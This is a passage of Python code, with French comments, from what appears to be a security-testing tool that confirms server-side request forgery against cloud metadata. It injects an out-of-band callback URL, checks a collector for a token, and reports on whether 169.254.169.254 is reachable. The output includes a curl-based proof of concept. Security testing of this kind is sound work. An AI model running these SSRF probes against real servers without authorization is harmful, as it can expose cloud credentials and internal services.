            st, _ = self._inject(action, param, cb_url, method, headers, timeout)
            if st is not None:
                seen_network = True
            cs, cbody = self._fetch(check_url, timeout=action.params.get("callback_timeout", 15))
            if cs is not None:
                seen_network = True
            received = (cs == 200 and token in (cbody or ""))
            if received:
                return [self.proof(
                    target=action.target, proven=True,
                    title=("SSRF cloud-metadata CONFIRMÉ — callback out-of-band reçu (SSRF vers URL "
                           "arbitraire ; plage lien-local métadonnées joignable)"),
                    severity="HIGH",
                    evidence=(f"cible SSRF-able={action.target} ; callback={cb_url} ; collecteur HTTP {cs} ; "
                              f"token_reçu=True (token={token}) — SSRF confirmé HORS-BANDE (non aveugle : le "
                              f"collecteur a VU la requête) ; la plage lien-local (169.254.169.254) est donc "
                              f"joignable par le serveur ; non destructif"),
                    poc=(f"# 1) injecter {param}={cb_url} dans {action.target}\n"
                         f"# 2) curl -sS '{check_url}'  # chercher le token {token}"))]

        # (4) DÉGRADATION GRACIEUSE — aucune réponse (réseau indisponible) -> skipped (offline-safe).
        if not seen_network:
            return [self.degraded(
                target=action.target,
                title="SSRF cloud-metadata non testé — réseau indisponible (dégradation gracieuse)",
                evidence="Aucune réponse du serveur (transport indisponible) sur les sondes métadonnées ; offline-safe.",
                poc=self.dry(action))]

        # Réseau vu mais ni signature in-band ni callback -> pas de verdict aveugle.
        return [self.proof(
            target=action.target, proven=False,
            title="SSRF cloud-metadata non confirmé — aucune signature métadonnées ni callback (pas de verdict aveugle)",
            severity="INFO",
            evidence=(f"cible SSRF-able={action.target} ; providers sondés={[p[0] for p in probes]} ; aucune "
                      f"signature de contenu métadonnées in-band (reflet neutralisé) et "
                      f"{'aucun callback reçu' if (cb_base and check_url) else 'pas de collecteur configuré'} ; "
                      f"non destructif, chemins index non-secrets uniquement"),
            poc=self.dry(action))]
